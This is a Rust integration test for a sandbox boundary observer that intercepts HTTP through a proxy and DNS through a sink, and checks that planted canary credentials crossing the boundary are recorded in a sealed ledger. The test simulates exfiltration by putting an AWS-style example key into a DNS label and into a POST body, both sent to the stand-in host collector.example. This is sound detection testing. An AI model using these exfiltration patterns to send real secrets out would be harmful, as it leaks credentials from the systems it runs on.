//! `chamber-boundary` driven as a real process, on loopback.
//!
//! The library's own suites prove the proxy decrypts and the DNS sink records.
//! What is untested until here is the *binary*: that its two listeners come up,
//! that both observers write into one ledger through one ordinal sequence, that
//! the canaries it was configured with are the ones it watches for, and that a
//! stop signal closes the file off rather than abandoning it.
//!
//! None of that needs a container, which is why it runs in the loopback CI job
//! rather than the containment one.

use std::io::{BufRead, BufReader};
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant};

use chamber_capture::read_ledger;
use chamber_evidence::{Channel, ObservationKind};

const CANARY: &str = "AKIAIOSFODNN7EXAMPLE";

/// A free port, found by binding and releasing.
///
/// Racy in principle. In practice the window is microseconds and the
/// alternative — fixed ports — collides with whatever else is on the machine,
/// which is a worse kind of flake because it looks like a product failure.
fn free_port() -> u16 {
    std::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
        .expect("bind ephemeral")
        .local_addr()
        .expect("addr")
        .port()
}

struct Boundary {
    child: Child,
    ledger: PathBuf,
    proxy: SocketAddr,
    dns: SocketAddr,
}

impl Boundary {
    /// Starts the binary and blocks until it says it is listening.
    fn start(dir: &PathBuf) -> Self {
        std::fs::create_dir_all(dir).expect("scratch dir");
        let ledger = dir.join("ledger.jsonl");
        let ca_out = dir.join("chamber-ca.pem");
        let (proxy_port, dns_port) = (free_port(), free_port());
        let proxy: SocketAddr = format!("127.0.0.1:{proxy_port}").parse().unwrap();
        let dns: SocketAddr = format!("127.0.0.1:{dns_port}").parse().unwrap();

        let mut child = Command::new(env!("CARGO_BIN_EXE_chamber-boundary"))
            .env("CHAMBER_LEDGER", &ledger)
            .env("CHAMBER_CA_OUT", &ca_out)
            .env("CHAMBER_PROXY_ADDR", proxy.to_string())
            .env("CHAMBER_DNS_ADDR", dns.to_string())
            .env("CHAMBER_ANSWER_WITH", "127.0.0.1")
            .env("CHAMBER_CANARY_AWS_KEY", CANARY)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn chamber-boundary");

        // Readiness is announced, not slept for. A sleep would pass on a fast
        // machine and produce an unexplainable flake on a slow one.
        let stdout = child.stdout.take().expect("piped stdout");
        let mut lines = BufReader::new(stdout).lines();
        let deadline = Instant::now() + Duration::from_secs(30);
        let mut saw_listening = false;
        while Instant::now() < deadline {
            match lines.next() {
                Some(Ok(line)) => {
                    eprintln!("boundary: {line}");
                    if line.trim() == "LISTENING" {
                        saw_listening = true;
                        break;
                    }
                }
                Some(Err(e)) => panic!("reading boundary stdout: {e}"),
                None => break,
            }
        }
        assert!(
            saw_listening,
            "chamber-boundary never reported LISTENING; it is not safe to run an \
             artefact against an observer that has not confirmed it is up"
        );

        // The CA certificate is what the host places in the guest's tmpfs.
        assert!(ca_out.exists(), "no CA certificate was written");
        let pem = std::fs::read_to_string(&ca_out).expect("read ca");
        assert!(pem.contains("BEGIN CERTIFICATE"), "CA is not PEM: {pem}");

        Self {
            child,
            ledger,
            proxy,
            dns,
        }
    }

    /// Stops it the way the engine does, and waits for the seal.
    fn stop(mut self) -> PathBuf {
        let pid = self.child.id();
        // SIGTERM, not kill(): Child::kill sends SIGKILL, which is the case
        // where the ledger is DELIBERATELY left unsealed. Here we want the
        // graceful path.
        let _ = Command::new("kill")
            .args(["-TERM", &pid.to_string()])
            .status();
        let status = self.child.wait().expect("wait for boundary");
        assert!(
            status.success(),
            "chamber-boundary exited {status:?}; a non-zero exit here means \
             observations did not reach the ledger"
        );
        self.ledger
    }
}

/// Sends one A query and returns once the socket has been written.
fn ask_dns(server: SocketAddr, qname: &str) {
    // Hand-built so the test does not depend on a resolver's own retry,
    // caching or search-list behaviour — it is the observation that matters,
    // not the answer.
    let mut msg: Vec<u8> = vec![
        0x12, 0x34, // id
        0x01, 0x00, // recursion desired
        0x00, 0x01, // one question
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    for label in qname.split('.') {
        msg.push(u8::try_from(label.len()).expect("label under 64 bytes"));
        msg.extend_from_slice(label.as_bytes());
    }
    msg.push(0);
    msg.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // A, IN

    let socket = UdpSocket::bind((Ipv4Addr::LOCALHOST, 0)).expect("bind client");
    socket
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    socket.send_to(&msg, server).expect("send query");

    let mut buf = [0u8; 512];
    let answered = socket.recv_from(&mut buf).is_ok();
    assert!(answered, "the DNS sink did not answer {qname}");
}

#[test]
fn the_boundary_records_both_channels_into_one_sealed_ledger() {
    let dir = std::env::temp_dir().join(format!("chamber-boundary-{}", std::process::id()));
    let boundary = Boundary::start(&dir);

    // A name whose labels carry the canary — the DNS exfil shape.
    ask_dns(boundary.dns, &format!("{CANARY}.collector.example"));

    // And a request through the proxy carrying it in the body.
    // A local runtime rather than reqwest's `blocking` feature: the rest of
    // this test is synchronous process-driving, and enabling another feature
    // to avoid four lines would widen the dependency surface of a crate whose
    // closure is deliberately watched.
    tokio::runtime::Runtime::new()
        .expect("runtime")
        .block_on(async {
            let client = reqwest::Client::builder()
                .proxy(reqwest::Proxy::all(format!("http://{}", boundary.proxy)).expect("proxy"))
                .timeout(Duration::from_secs(15))
                .build()
                .expect("client");
            // The origin does not exist and must not be reached; what matters
            // is that the boundary observed the attempt and read the body
            // before deciding what to do with it.
            let _ = client
                .post("http://collector.example/ingest")
                .body(format!("token={CANARY}"))
                .send()
                .await;
        });

    let ledger_path = boundary.stop();

    let ledger = read_ledger(&ledger_path).expect("read the ledger");
    assert!(
        !ledger.is_truncated(),
        "a ledger sealed on SIGTERM must not read as cut off"
    );

    let observations = ledger.observations();
    assert!(
        observations.len() >= 2,
        "expected both channels in the ledger, got {observations:#?}"
    );

    // One sequence across both observers, contiguous from zero. This is the
    // property that makes an interleaving recoverable, and it is only true
    // because they share a process.
    let ids: Vec<u64> = observations.iter().map(|o| o.id().0).collect();
    assert_eq!(
        ids,
        (0..observations.len() as u64).collect::<Vec<_>>(),
        "ordinals are not contiguous from zero"
    );

    let saw_dns = observations.iter().any(|o| {
        o.channel() == Channel::DnsResolution
            && matches!(o.kind(), ObservationKind::NameQuery { qname, .. } if qname.contains(CANARY))
    });
    assert!(saw_dns, "the DNS query was not recorded: {observations:#?}");

    let saw_http = observations
        .iter()
        .any(|o| o.channel() == Channel::NetworkEgress);
    assert!(
        saw_http,
        "the proxied request was not recorded: {observations:#?}"
    );

    // The canary was planted and crossed the boundary, so at least one
    // observation must be a witness. Without this the run would report no
    // finding while the token was sitting in the ledger.
    let witnesses = observations.iter().filter(|o| o.is_witness()).count();
    assert!(
        witnesses > 0,
        "the planted canary crossed the boundary and nothing was marked as a witness: \
         {observations:#?}"
    );
}

/// An observer with nothing to look for finds nothing and reports no finding —
/// a false negative shaped exactly like a clean result. It must refuse to start.
#[test]
fn a_boundary_with_no_canaries_refuses_to_start() {
    let dir = std::env::temp_dir().join(format!("chamber-empty-{}", std::process::id()));
    std::fs::create_dir_all(&dir).expect("scratch dir");

    // Spawned with a deadline rather than `output()`, which waits forever.
    // An observer that does NOT refuse goes on to listen and sits there until
    // signalled — so `output()` would hang instead of failing, and a hang in CI
    // is a timeout with no explanation rather than a test naming what broke.
    let mut child = Command::new(env!("CARGO_BIN_EXE_chamber-boundary"))
        .env("CHAMBER_LEDGER", dir.join("ledger.jsonl"))
        .env("CHAMBER_CA_OUT", dir.join("ca.pem"))
        .env("CHAMBER_PROXY_ADDR", format!("127.0.0.1:{}", free_port()))
        .env("CHAMBER_DNS_ADDR", format!("127.0.0.1:{}", free_port()))
        .env_remove("CHAMBER_CANARY_AWS_KEY")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn chamber-boundary");

    let deadline = Instant::now() + Duration::from_secs(20);
    let status = loop {
        match child.try_wait().expect("poll the child") {
            Some(status) => break status,
            None if Instant::now() >= deadline => {
                let _ = child.kill();
                let _ = child.wait();
                panic!(
                    "an observer with no canaries did not refuse: it is still running, \
                     which means a run configured this way would complete and report \
                     no finding with nothing ever having been looked for"
                );
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    };

    assert!(!status.success(), "an empty observer exited successfully");
    let out = child.wait_with_output().expect("collect output");
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(
        err.contains("nothing to look for"),
        "the refusal does not say why: {err}"
    );
}
